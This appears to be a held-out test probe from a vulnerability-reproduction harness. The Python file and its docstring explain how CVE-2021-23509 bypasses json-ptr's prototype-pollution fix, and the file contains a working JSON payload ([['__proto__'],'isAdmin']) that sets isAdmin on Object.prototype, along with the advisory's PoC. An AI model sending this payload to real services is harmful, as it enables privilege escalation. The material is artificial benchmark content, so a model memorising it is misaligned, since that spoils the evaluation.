#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2021-23509 residual -- nested-array (type-confusion) bypass of the 2.0.0 fix.

real-app-http: fired as REAL EXTERNAL HTTP against the running Express service:
  POST /set  {"pointer": [["__proto__"],"isAdmin"], "value": true}
then GET /check observes whether Object.prototype was polluted. The service calls the REAL published
JsonPointer.set({}, pointer, value, true) on the attacker JSON -- no in-process probe, no source-lift.

The CVE-2020-7766 fix (present on V1 = json-ptr 2.0.0) guards each segment with a strict `===` STRING
comparison and NO type coercion, at the top of each setValueAtPath while-loop step:

    if (step === '__proto__' || step === 'constructor' || step === 'prototype') throw ...

A pointer whose FIRST segment is itself an array -- `[["__proto__"], "isAdmin"]` -- makes the dangerous
segment the ARRAY `["__proto__"]`. `["__proto__"] === '__proto__'` is FALSE (array vs string), so the
guard PASSES it; then the native deref `it = it[step]` coerces the array back to the string
'__proto__' (Array.prototype.toString joins a single-element array to "__proto__"), so the walk still
steps onto Object.prototype and the leaf write (force=true) sets `isAdmin = true` onto it = CWE-843
type confusion. A later GET /check sees `({}).isAdmin === true` and releases the flag on V1.

This is CVE-2021-23509, which SNYK-JS-JSONPTR-1577291 states is 'a bypass of CVE-2020-7766 when the
user-provided keys used in the pointer parameter are arrays'. Advisory PoC:
JsonPointer.set({}, [['__proto__'], 'polluted'], 'success', true).

CVE-2021-23509 fix (V2 = json-ptr 3.0.0) adds, BEFORE the string guard, a per-segment type-check:

    if (typeof step !== 'string' && typeof step !== 'number') throw new TypeError(...)

The nested-array segment is typeof 'object', so this throws BEFORE any deref/write -- the residual is
rejected (POST /set blocked, /check stays null, no flag).

Contract: reaches the flag on V1; closed on V2.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A POST /set whose first pointer segment is a NESTED ARRAY of the dangerous name."""
    return {
        "probe_id": "cve-2021-23509-nested-array-proto",
        "method": "POST",
        "path_route": "/set",
        "pointer": [["__proto__"], "isAdmin"],
        "value": True,
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo"))
